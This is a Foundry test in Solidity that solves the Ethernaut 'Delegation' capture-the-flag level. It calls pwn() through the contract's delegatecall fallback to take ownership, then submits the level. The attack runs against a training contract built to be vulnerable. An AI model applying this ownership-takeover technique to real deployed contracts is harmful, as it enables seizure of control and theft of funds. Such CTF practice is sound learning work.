// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/6-Delegation/DelegationFactory.sol";
import "../src/Ethernaut.sol";

contract DelegationTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);
    address toAddress = address(200);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);
    }

    function testDelegationHack() public {
        // Level setup
        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress));

        // Level attack
        (bool success, ) = address(ethernautDelegation).call(abi.encodeWithSignature("pwn()", ""));
        assertTrue(success);

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}